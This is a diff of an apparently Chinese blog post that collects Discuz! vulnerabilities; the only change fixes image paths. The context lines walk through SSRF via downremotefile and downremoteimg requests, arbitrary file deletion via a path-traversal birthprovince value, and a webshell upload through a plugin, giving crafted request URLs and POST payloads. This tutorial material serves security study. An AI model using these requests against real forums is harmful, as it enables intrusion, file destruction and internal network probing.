 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93624">https://www.seebug.org/vuldb/ssvid-93624</a></p>
 <h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p><strong>漏洞描述：</strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)<br>是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF<br>形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。可利用来探测内网信息或获取别的网站的信息或钓鱼等。涉及URL如下：</p>
@@ -526,23 +526,23 @@
 <p><strong>漏洞级别：</strong>高危</p>
 <p>测试步骤与截图：</p>
 <h3 id="演示1：SSRF漏洞"><a href="#演示1：SSRF漏洞" class="headerlink" title="演示1：SSRF漏洞"></a>演示1：SSRF漏洞</h3><p>利用前提 ptid&#x3D;&#x3D;aid且两者必须存在(ptid&#x3D;&#x3D;帖子id,aid&#x3D;&#x3D;门户文章id),pid&#x3D;任意评论id。<br>即论坛门户发表过文章，准备和确认<a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&amp;aid=1">http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&amp;aid=1</a><br>确认门户中存在发表过的文章,记录下可用的aid</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/c7fdbe9b01886221ed6af7f6294662f2.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/c7fdbe9b01886221ed6af7f6294662f2.png" class>
 
 <p>第一步 登陆后,请求获取modauthkey算出的一个key,用于操作对应文章:<br><a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&amp;goto=findpost&amp;modthreadkey=1&amp;ptid=1&amp;pid=1">http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&amp;goto=findpost&amp;modthreadkey=1&amp;ptid=1&amp;pid=1</a></p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3655f2c2013bcc964feef6be4b830deb.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3655f2c2013bcc964feef6be4b830deb.png" class>
 
 <p>从跳转的链接取出modthreadkey的参数值:<br><a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&amp;tid=1&amp;page=1&amp;modthreadkey=fce8163c9f310147f91a244a9eb9dc33%5C#pid1">http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&amp;tid=1&amp;page=1&amp;modthreadkey=fce8163c9f310147f91a244a9eb9dc33\#pid1</a></p>
 <p>第二步 带上当前formhash,modarticlekey拼上第一步的modthreadkey的值,即可发请求:<br>POST:<a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&amp;ac=upload&amp;aid=1&amp;catid=1&amp;op=downremotefile&amp;formhash=760dc9d6&amp;modarticlekey=fce8163c9f310147f91a244a9eb9dc33&amp;content=%5C">http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&amp;ac=upload&amp;aid=1&amp;catid=1&amp;op=downremotefile&amp;formhash=760dc9d6&amp;modarticlekey=fce8163c9f310147f91a244a9eb9dc33&amp;content=\</a><img src="http://internal.zabbix/images/general/zabbix.png\"> aa&#x3D;a</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3cb02a3ff18c3a978a9d4cef5644181e.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3cb02a3ff18c3a978a9d4cef5644181e.png" class>
 
 <p>internal.zabbix域名下的图片被下载并上传到Discuz指定的图片路径下:<br><a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png">http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png</a></p>
 <p><a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg">http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg</a></p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/858590279078a58213d111945ba8800e.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/858590279078a58213d111945ba8800e.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="http://0day5.com/archives/3920/">http://0day5.com/archives/3920/</a></p>
 <h3 id="演示2：另一处SSRF漏洞（2-x，3-x）"><a href="#演示2：另一处SSRF漏洞（2-x，3-x）" class="headerlink" title="演示2：另一处SSRF漏洞（2.x，3.x）"></a>演示2：另一处SSRF漏洞（2.x，3.x）</h3><p>访问<a target="_blank" rel="noopener" href="http://xxxx/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=%5Bimg=1,1%5Dhttp://xxxxxxxxxxxxxx.jpg%5B/img%5D&amp;formhash=09cec465">http://xxxx/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://xxxxxxxxxxxxxx.jpg[/img]&amp;formhash=09cec465</a></p>
 <p>3.x 版本如果请求提示xss拦截要带上 formhash<br>加cookie,之前版本好像不用。SSRF成功后，域名被解析成IP。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3e680cf0afb06099addb160c719dd884.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3e680cf0afb06099addb160c719dd884.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=151179">https://bugs.shuimugan.com/bug/view?bug_no=151179</a></p>
 <h2 id="文件操作类漏洞"><a href="#文件操作类漏洞" class="headerlink" title="文件操作类漏洞"></a>文件操作类漏洞</h2><p><strong>漏洞描述：</strong>由于没有对文件操作类的函数做好限制，导致discuz组件存在文件上传漏洞、任意文件删除漏洞、本地文件包含漏洞。涉及URL如下：</p>
@@ -551,32 +551,32 @@
 <p>#管理后台-应用-插件-演示2</p>
 <p>测试步骤与截图：</p>
 <h3 id="演示1：Discuz-X前台任意文件删除漏洞"><a href="#演示1：Discuz-X前台任意文件删除漏洞" class="headerlink" title="演示1：Discuz!X前台任意文件删除漏洞"></a>演示1：Discuz!X前台任意文件删除漏洞</h3><p>新建importantfile.txt作为测试 进入设置-个人资料，先在页面源代码找到formhash值<br><a target="_blank" rel="noopener" href="http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile">http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile</a></p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b62795c5be846c3c7036f061739342ec.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b62795c5be846c3c7036f061739342ec.png" class>
 
 <p>可以看到formhash值是b21b6577。再访问10.0.2.15:8999&#x2F;discuz3_2&#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base<br>Post数据：birthprovince&#x3D;..&#x2F;..&#x2F;..&#x2F;importantfile.txt&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;b21b6577<br>如图</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3dd60f54cebf35cf2bf8a72a049f7ce4.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3dd60f54cebf35cf2bf8a72a049f7ce4.png" class>
 
 <p>执行后</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1e57cee32d198af9e3c6a28a5955d587.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1e57cee32d198af9e3c6a28a5955d587.png" class>
 
 <p>出生地被修改成要删除的文件。最后构造表单执行删除文件</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4781de6b2740e55dbd867bb9986cb732.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4781de6b2740e55dbd867bb9986cb732.png" class>
 
 <p>随便上传一张图片，即可删除importantfile.txt。</p>
 <p><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/149904.html">http://www.freebuf.com/vuls/149904.html</a></p>
 <h3 id="演示2：Discuz-后台第三方插件上传任意后缀文件拿shell（某插件导致）"><a href="#演示2：Discuz-后台第三方插件上传任意后缀文件拿shell（某插件导致）" class="headerlink" title="演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）"></a>演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）</h3><p>问题插件出在：[MZG]点广告赚积分 1.0<br><a target="_blank" rel="noopener" href="http://addon.discuz.com/?@mzg_advertise.plugin">http://addon.discuz.com/?@mzg_advertise.plugin</a> 1.先搜索 “MZG” 找到<br>点广告赚积分。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/28b9ef060ed6856c5e28f2a6d3afda50.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/28b9ef060ed6856c5e28f2a6d3afda50.png" class>
 
 <p>安装插件，安装GBK还是UFT8随你系统编码选择。安装好插件后，选择 “添加广告”。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/6537467b1c4ad95ad2df969576ecb389.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/6537467b1c4ad95ad2df969576ecb389.png" class>
 
 <p>添加广告里面的 LOGO<br>文件上传，选本地上传，这里面未限制文件后缀，可以上传任意后缀名文件。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0040a2852de1adfd6c74535d7e88a3d2.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0040a2852de1adfd6c74535d7e88a3d2.png" class>
 
 <p>查看添加的广告，看到了吧？</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5c32e20f2e7bc168defad3174014ff0c.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5c32e20f2e7bc168defad3174014ff0c.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9d383b898f5ee40aaa646ae31082e72f.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9d383b898f5ee40aaa646ae31082e72f.png" class>
 
 <p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93632">https://www.seebug.org/vuldb/ssvid-93632</a></p>
 <h2 id="其他类型漏洞"><a href="#其他类型漏洞" class="headerlink" title="其他类型漏洞"></a>其他类型漏洞</h2><p><strong>漏洞描述：</strong>越权、xxe</p>
